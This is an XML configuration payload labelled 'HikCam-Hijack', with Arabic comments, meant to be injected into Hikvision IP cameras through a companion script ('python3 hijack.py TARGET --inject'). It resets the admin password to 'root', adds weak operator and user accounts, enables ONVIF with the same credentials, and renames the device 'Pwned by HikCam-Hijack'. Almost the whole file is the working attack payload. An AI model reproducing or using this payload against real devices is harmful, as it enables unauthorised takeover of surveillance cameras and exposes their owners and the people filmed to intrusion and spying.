<?xml version="1.0" encoding="UTF-8"?>
<!--
  HikCam-Hijack — Config Injection Payload
  يغير باسورد المستخدم الأول (admin) إلى admin:root
  استخدم مع: python3 hijack.py TARGET --inject
-->
<Config version="2.0">
    <!-- ======== DEVICE INFO ======== -->
    <DeviceInfo>
        <deviceName>HikCam-Hijacked</deviceName>
        <deviceID>HC-001</deviceID>
        <deviceDescription>Pwned by HikCam-Hijack</deviceDescription>
        <manufacturer>Hikvision</manufacturer>
        <model>DS-2CD2xx2FWD-I</model>
        <firmwareVersion>V5.4.5</firmwareVersion>
        <firmwareReleasedDate>2017-01-23</firmwareReleasedDate>
    </DeviceInfo>

    <!-- ======== USER LIST ======== -->
    <UserList>
        <!-- المستخدم الأول — admin -->
        <User>
            <id>1</id>
            <userName>admin</userName>
            <password>root</password>
            <userLevel>administrator</userLevel>
        </User>

        <!-- المستخدم الثاني — operator -->
        <User>
            <id>2</id>
            <userName>operator</userName>
            <password>operator</password>
            <userLevel>operator</userLevel>
        </User>

        <!-- المستخدم الثالث — user -->
        <User>
            <id>3</id>
            <userName>user</userName>
            <password>user</password>
            <userLevel>user</userLevel>
        </User>
    </UserList>

    <!-- ======== ONVIF ======== -->
    <ONVIF>
        <enabled>true</enabled>
        <port>80</port>
        <userName>admin</userName>
        <password>root</password>
    </ONVIF>

    <!-- ======== NETWORK ======== -->
    <Network>
        <DHCP>false</DHCP>
        <IPAddress>192.168.1.108</IPAddress>
        <SubnetMask>255.255.255.0</SubnetMask>
        <Gateway>192.168.1.1</Gateway>
        <DNS>8.8.8.8</DNS>
        <HTTPPort>80</HTTPPort>
        <RTSPPort>554</RTSPPort>
        <HTTPSPort>443</HTTPSPort>
    </Network>

    <!-- ======== PTZ ======== -->
    <PTZ>
        <enabled>true</enabled>
        <protocol>PELCO_D</protocol>
        <baudRate>2400</baudRate>
    </PTZ>

    <!-- ======== STORAGE ======== -->
    <Storage>
        <recordMode>continuous</recordMode>
        <recordDuration>7</recordDuration>
        <overwrite>true</overwrite>
    </Storage>
</Config>
